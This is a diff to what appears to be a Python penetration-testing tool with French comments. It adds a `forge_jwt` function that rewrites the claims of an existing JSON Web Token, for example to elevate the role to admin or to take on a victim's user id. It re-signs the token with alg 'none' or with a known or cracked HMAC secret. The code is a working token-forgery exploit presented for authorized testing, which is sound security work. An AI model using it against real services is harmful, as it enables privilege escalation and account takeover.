@@ -242,6 +242,64 @@ def _decode_jwt_part(part: str) -> dict[str, Any] | None:
         return None
 
 
+def _b64url(obj: dict[str, Any]) -> str:
+    """Encode un dict en segment JWT base64url sans padding."""
+    raw = json.dumps(obj, separators=(",", ":"), ensure_ascii=False).encode()
+    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
+
+
+def forge_jwt(
+    token: str,
+    claim_overrides: dict[str, Any],
+    secret: str | None = None,
+) -> str | None:
+    """
+    Forge un nouveau JWT à partir d'un token EXISTANT en remplaçant/ajoutant des
+    claims (ex. {"role": "admin"} ou {"sub": "<id victime>"}).
+
+    PUR : cette fonction ne fait qu'ENCODER un token (aucune requête réseau). La
+    forge ne devient un acte offensif que lorsque le token est ENVOYÉ à la cible
+    — ce que fait la couche de confirmation (sous RoE, en lecture seule).
+
+    Règles de signature :
+      - algorithme 'none' → token forgeable sans secret (signature vide) ;
+      - HS256/384/512 → forgeable UNIQUEMENT si `secret` est fourni (recalcul HMAC) ;
+      - sinon (RS/ES… ou secret inconnu) → None (non forgeable).
+
+    Returns:
+        Le token forgé (str) ou None si la forge est impossible.
+    """
+    parts = (token or "").split(".")
+    if len(parts) < 2:
+        return None
+    header = _decode_jwt_part(parts[0])
+    payload = _decode_jwt_part(parts[1])
+    if header is None or payload is None:
+        return None
+
+    new_payload = {**payload, **(claim_overrides or {})}
+    alg = str(header.get("alg", "none"))
+
+    if alg.lower() == "none":
+        new_header = {**header, "alg": "none"}
+        return f"{_b64url(new_header)}.{_b64url(new_payload)}."
+
+    hash_funcs = {"HS256": hashlib.sha256, "HS384": hashlib.sha384,
+                  "HS512": hashlib.sha512}
+    hash_func = hash_funcs.get(alg.upper())
+    if hash_func and secret:
+        h_seg = _b64url(header)
+        p_seg = _b64url(new_payload)
+        signing_input = f"{h_seg}.{p_seg}".encode()
+        sig = base64.urlsafe_b64encode(
+            hmac.new(secret.encode(), signing_input, hash_func).digest()
+        ).rstrip(b"=").decode()
+        return f"{h_seg}.{p_seg}.{sig}"
+
+    # Algorithme asymétrique, ou secret inconnu pour HMAC → non forgeable.
+    return None
+
+
 def _crack_jwt_secret(
     token: str,
     parts: list[str],
